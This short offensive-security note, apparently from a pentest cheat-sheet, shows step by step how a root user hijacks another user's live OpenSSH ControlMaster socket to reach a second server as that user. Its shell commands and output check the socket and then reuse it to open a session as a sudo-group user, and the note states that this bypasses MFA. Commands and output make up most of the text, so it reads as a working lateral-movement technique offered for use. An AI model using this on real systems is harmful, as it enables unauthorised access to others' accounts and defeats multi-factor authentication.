# Connection Multiplexing Hijacking

## Verify Connection Multiplexing Socket

The `ControlMaster` socket is active and can be used:

Test if the socket can still be used for connection multiplexing:

```shell-session
root@linux-srv-05:/home/dave# ssh -S .ssh/cm-dave-linux-srv-06-22 -O check invalid
Master running (pid=20)
```

- `-S` is used to specify the path to the socket.
- `-O check` is used to check if the socket can still be used.
- `invalid` is used to just provide a necessary argument (no valid hostname is required).

## Connection Multiplexing Socket Hijacking

Hijack this socket to perform a login on the given connection:

```shell-session
root@linux-srv-05:/home/dave# ssh -v -S .ssh/cm-dave-linux-srv-06-22 invalid
debug1: OpenSSH_10.0p2 Debian-7, OpenSSL 3.5.1 1 Jul 2025
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 5: Applying options for *
debug1: mux_client_request_session: master session id: 4

dave@linux-srv-06:~$ hostname
linux-srv-06.nullbyte.internal

dave@linux-srv-06:~$ id
uid=1000(dave) gid=1000(dave) groups=1000(dave),27(sudo)
dave@linux-srv-06:~$ 
```

- It was possible to bypass MFA by hijacking an already authenticated socket of `dave`.
- SSH did not provide much output, even tough the -v flag was specified. No information regarding the authentication process was shown. This is because the authentication was already performed by the real `dave`. The welcome banner and motd was not shown because of this.